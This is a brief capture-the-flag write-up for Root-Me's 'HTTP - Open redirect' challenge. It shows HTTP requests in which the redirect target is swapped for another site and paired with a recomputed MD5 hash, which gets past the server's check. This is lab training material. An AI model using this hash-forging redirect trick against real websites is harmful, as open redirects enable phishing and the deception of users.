# Challange Info

Name : HTTP - Open redirect

Difficulty : Very easy

Category : Web Server

Link : https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-redirect

# Writeup

Capturing the redirect request with burpsuite.

The redirect is being checked with a MD5 hash.

```
GET /web-serveur/ch52/?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134 HTTP/1.1
```

Generating a hash for some other website and changing website and hash in URL.

```
GET /web-serveur/ch52/?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f HTTP/1.1
```

This will send one request which I sent to repeater.

```
GET /web-serveur/ch52/?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f HTTP/1.1

Host: challenge01.root-me.org

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

sec-gpc: 1

Connection: keep-alive
```

In response of this request flag is there.
